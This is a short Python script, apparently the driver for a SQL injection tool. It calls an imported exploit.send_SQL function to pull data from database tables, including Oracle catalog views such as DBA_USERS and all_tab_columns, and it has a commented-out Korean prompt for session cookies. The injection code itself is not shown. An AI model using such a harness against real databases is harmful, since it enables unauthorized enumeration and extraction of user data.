import exploit
import query


if __name__ == "__main__":
    # exploit.send_SQL("USERNAME", "DBA_USERS")
    # exploit.send_SQL("column_name", "all_tab_columns", "COMM_FILE")

    # cookies = input("쿠키 값을 입력하세요: ")
    # query.set_cookies(cookies)

    data = exploit.send_SQL("REG_DT", "BOARD")

    print(data)
